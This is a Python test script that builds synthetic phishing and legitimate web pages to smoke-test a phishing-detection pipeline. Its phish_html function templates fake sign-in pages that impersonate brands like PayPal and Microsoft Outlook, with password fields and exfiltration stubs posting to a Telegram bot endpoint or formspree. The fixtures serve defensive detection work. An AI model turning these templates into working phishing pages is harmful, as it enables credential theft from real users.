"""
tests/smoke_data.py
===================
Builds a small SYNTHETIC store so the training / clustering / evaluation code
can be exercised end-to-end without network access. Pages are generated from
templates with random variation and pushed through the real extractor with a
seeded fetch.

These numbers mean nothing and must never be reported. They exist only to
prove the pipeline runs.

    python tests/smoke_data.py /tmp/smoke.db 600
"""
from __future__ import annotations

import datetime as dt
import random
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import module3_behavioral.extraction.extractor as ex  # noqa: E402
from common.store import ScanStore  # noqa: E402
from module3_behavioral.extraction.fetch import FetchResult  # noqa: E402

PLATFORMS = ["pages.dev", "vercel.app", "github.io", "netlify.app", "web.app"]
BRANDS = ["Microsoft Outlook", "PayPal", "SBI YONO", "Netflix", "Coinbase", "DHL"]
WORDS = "alpha beta gamma delta docs blog notes project guide release api kit".split()


def phish_html(rng, kit):
    brand = rng.choice(BRANDS)
    exfil = ['<script>fetch("https://api.telegram.org/bot1:x/sendMessage")</script>',
             '<form action="https://formspree.io/f/abc">', '<form action="#">'][kit % 3]
    return (f"<html><head><title>{brand} - Sign in</title></head><body>"
            f'<img src="data:image/png;base64,AA" alt="{brand} logo"><h1>Verify your {brand} account</h1>'
            f"{exfil}<input type='email' name='login'><input type='password' name='pw'>"
            f"<p>Your account will be suspended. Act now.</p></form></body></html>")


def legit_html(rng):
    w = " ".join(rng.choice(WORDS) for _ in range(rng.randint(40, 200)))
    login = rng.random() < 0.15
    form = "<form action='/session'><input name='user'><input type='password' name='p'></form>" if login else ""
    links = "".join(f"<a href='/{rng.choice(WORDS)}'>x</a>" for _ in range(rng.randint(3, 30)))
    return f"<html><head><title>{rng.choice(WORDS)} docs</title></head><body><h1>{rng.choice(WORDS)}</h1>{form}<p>{w}</p>{links}</body></html>"


def build(path: str, n: int, seed: int = 0) -> None:
    rng = random.Random(seed)
    ex.lookup_asn = lambda ip: ("AS13335", "Cloudflare")
    store = ScanStore(path)
    now = dt.datetime(2026, 10, 1)
    for i in range(n):
        scam = rng.random() < 0.5
        free = rng.random() < 0.6
        tenant = f"{rng.choice(WORDS)}-{rng.choice(WORDS)}-{i}"
        host = f"{tenant}.{rng.choice(PLATFORMS)}" if free else f"{tenant}.{'xyz' if scam else 'com'}"
        url = f"https://{host}/" + ("login.html" if scam and rng.random() < .5 else "")
        html = phish_html(rng, i % 7) if scam else legit_html(rng)
        if scam and rng.random() < 0.15:          # some phish look clean
            html = legit_html(rng)
        age = rng.randint(3000, 6000) if free else (rng.randint(1, 60) if scam and rng.random() < .7 else rng.randint(200, 6000))

        def f(u, save=True, html=html, host=host, age=age):
            return FetchResult(url=u, final_url=u, status_code=200, ok=True, html=html,
                               resolved_ip=f"104.16.{rng.randint(0, 9)}.{rng.randint(1, 250)}",
                               ssl_issuer="Google Trust Services",
                               ssl_not_before=now - dt.timedelta(days=rng.randint(5, 80)),
                               whois_creation=now - dt.timedelta(days=age),
                               whois_expiration=now + dt.timedelta(days=365),
                               cert_names=[f"*.{host.split('.', 1)[1]}"] if free else [host],
                               redirect_hosts=[host])
        rec = ex.extract_features(url, fetch_fn=f, save_snapshot=False)
        snap = Path(path + ".snap") / f"{i}.html"
        snap.parent.mkdir(parents=True, exist_ok=True)
        snap.write_text(html, encoding="utf-8")
        rec.snapshot_path = str(snap)
        rec.ground_truth = "scam" if scam else "legit"
        rec.features["meta_source"] = "smoke"
        if scam:
            rec.features["meta_listed_at"] = (now + dt.timedelta(hours=i)).isoformat() + "+00:00"
        store.write(rec.validate())
    print(f"wrote {n} synthetic records to {path}")


if __name__ == "__main__":
    build(sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 600)
